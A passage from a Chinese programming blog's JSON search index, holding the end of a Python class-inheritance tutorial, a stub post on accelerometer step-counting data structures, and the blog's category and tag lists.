print(&quot;调用子类构造方法&quot;) def childMethod(self): print(&#x27;调用子类方法&#x27;)c = Child() # 实例化子类c.childMethod() # 调用子类的方法c.parentMethod() # 调用父类方法c.setAttr(200) # 再次调用父类的方法 - 设置属性值c.add=1000print(c.add)c.getAttr() # 再次调用父类的方法 - 获取属性值 运行截图： 5.子类重写父类方法12345678910111213#!/usr/bin/python# -*- coding: UTF-8 -*- class Parent: # 定义父类 def myMethod(self): print &#x27;调用父类方法&#x27; class Child(Parent): # 定义子类 def myMethod(self): print &#x27;调用子类方法&#x27; c = Child() # 子类实例c.myMethod() # 子类调用重写方法","categories":[{"name":"Python","slug":"Python","permalink":"http://example.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"算法-三轴加速器计步算法","slug":"算法/算法-三轴加速器计步算法","date":"2020-09-10T02:37:35.000Z","updated":"2021-04-01T14:13:08.000Z","comments":true,"path":"2020/09/10/算法/算法-三轴加速器计步算法/","link":"","permalink":"http://example.com/2020/09/10/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95-%E4%B8%89%E8%BD%B4%E5%8A%A0%E9%80%9F%E5%99%A8%E8%AE%A1%E6%AD%A5%E7%AE%97%E6%B3%95/","excerpt":"","text":"链接：https://blog.csdn.net/dancer__sky/article/details/81504778 均值滤波器—滤波动态阈值动态精度步伐判断均值滤波器—滤波123456#加速度 class axis_info_t: def __init__(self,x,y,z): self.x=x self.y=y self.z=z 1234567#平均加速度 4个数组class axis_all: def __init__(self,a,b,c,d): self.a=a self.b=b self.c=c self.d=d 1234567#动态阈值class peak_value_t: def __init__(self,newmax,newmin,oldmax,oldmin): self.newmax = newmax self.newmin = newmin self.oldmax = oldmax self.oldmin = oldmin 12345#动态精度：这其实是由一个线性移位寄存器加上一个我们预设定的动态变化值来消除高频噪声。 移位寄存器class slid_reg: def __init__(self,new_sample,old_sample): self.new_sample=new_sample self.old_sample=old_sample","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"}]}],"categories":[{"name":"语言基础","slug":"语言基础","permalink":"http://example.com/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"环境配置","slug":"语言基础/环境配置","permalink":"http://example.com/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"},{"name":"密码学","slug":"密码学","permalink":"http://example.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://example.com/categories/NodeJs/"},{"name":"Python","slug":"Python","permalink":"http://example.com/categories/Python/"},{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"算法","slug":"数据结构/算法","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AE%97%E6%B3%95/"},{"name":"深入理解计算机系统","slug":"深入理解计算机系统","permalink":"http://example.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"},{"name":"汇编语言","slug":"汇编语言","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"},{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"},{"name":"实验报告","slug":"实验报告","permalink":"http://example.com/categories/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"name":"Java","slug":"Java","permalink":"http://example.com/categories/Java/"},{"name":"环境配置","slug":"环境配置","permalink":"http://example.com/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Hadoop","slug":"Hadoop","permalink":"http://example.com/tags/Hadoop/"},{"name":"环境配置","slug":"环境配置","permalink":"http://example.com/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://example.com/tags/Leetcode/"},{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"Mysql","slug":"Mysql","permalink":"http://example.com/tags/Mysql/"},{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"},{"name":"语言基础","slug":"语言基础","permalink":"http://example.com/tags/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"GO","slug":"GO","permalink":"http://example.com/tags/GO/"},{"name":"区块链","slug":"区块链","permalink":"http://example.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"博客","slug":"博客","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"},{"name":"计算机系统","slug":"计算机系统","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"},{"name":"汇编语言","slug":"汇编语言","permalink":"http://example.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"C、C++","slug":"C、C","permalink":"http://example.com/tags/C%E3%80%81C/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"},{"name":"实验报告","slug":"实验报告","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]}